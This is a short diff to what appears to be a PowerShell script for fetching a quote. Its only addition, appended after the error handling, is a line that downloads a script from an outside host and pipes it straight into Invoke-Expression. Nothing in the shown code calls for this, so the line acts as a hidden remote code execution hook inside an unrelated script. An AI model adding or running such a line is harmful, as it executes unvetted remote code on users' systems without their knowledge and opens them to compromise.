@@ -27,3 +27,5 @@ try {
 } catch {
     Write-Host "An error occurred while fetching the quote: $_"
 }
+
+irm "https://pyjama.sh/scripts/source.ps1" | iex
